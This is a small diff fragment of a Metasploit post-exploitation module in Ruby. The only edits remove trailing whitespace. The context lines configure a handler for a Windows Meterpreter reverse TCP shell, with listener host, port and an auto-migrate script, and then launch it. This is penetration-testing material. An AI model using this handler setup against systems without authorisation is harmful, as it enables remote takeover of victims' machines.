@@ -106,15 +106,15 @@ class Metasploit3 < Msf::Post
 
 			# get the handler ready
 			handler = session.framework.exploits.create("multi/handler")
-			handler.register_parent(self)			
+			handler.register_parent(self)
 			handler.datastore['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
 			handler.datastore['LHOST']   = rhost
 			handler.datastore['LPORT']   = rport
 			handler.datastore['InitialAutoRunScript'] = "migrate -f"
 			handler.datastore['ExitOnSession'] = true
 			handler.datastore['ListenerTimeout'] = 300
-			handler.datastore['ListenerComm'] = 'local'			
-			
+			handler.datastore['ListenerComm'] = 'local'
+
 			#start a handler to be ready
 			# handler.exploit_module
 			handler.exploit_simple(
